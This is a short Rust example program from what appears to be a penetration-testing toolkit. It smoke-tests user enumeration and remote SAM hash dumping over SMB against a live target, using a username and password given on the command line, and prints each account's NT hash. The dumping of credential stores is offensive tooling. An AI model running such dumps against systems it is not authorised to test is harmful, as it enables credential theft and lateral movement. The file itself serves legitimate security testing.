//! Smoke-test the pure-Rust SAMR + WINREG paths against a live target.
//!
//! Usage:
//!   cargo run -p netraze-protocols --example test_target -- 172.23.194.189 oxr Pass1234!

use netraze_protocols::smb::connection::SmbCredential;
use netraze_protocols::smb::dump::remote_dump_sam;
use netraze_protocols::smb::users::enum_users;

#[tokio::main]
async fn main() {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 || args.len() > 5 {
        eprintln!("Usage: {} <target> <username> <password> [domain]", args[0]);
        std::process::exit(1);
    }
    let target = &args[1];
    let username = &args[2];
    let password = &args[3];
    let domain = args.get(4).map(|s| s.as_str()).unwrap_or(".");

    let cred = SmbCredential::new(username, domain, password);

    println!("=== enum_users on {} ===", target);
    match enum_users(target, &cred).await {
        Ok(users) => {
            println!("Found {} user(s):", users.len());
            for u in &users {
                println!(
                    "  {} (rid={}, disabled={}, locked={})",
                    u.name, u.privilege_level, u.disabled, u.locked
                );
            }
        }
        Err(e) => {
            eprintln!("enum_users FAILED: {}", e);
        }
    }

    println!("\n=== remote_dump_sam on {} ===", target);
    match remote_dump_sam(target, &cred).await {
        Ok(result) => {
            println!("Dumped {} hash(es):", result.hashes.len());
            for h in &result.hashes {
                println!("  {}:{:x}:{}", h.username, h.rid, h.nt_hash);
            }
            for e in &result.errors {
                eprintln!("  error: {}", e);
            }
        }
        Err(e) => {
            eprintln!("remote_dump_sam FAILED: {}", e);
        }
    }
}
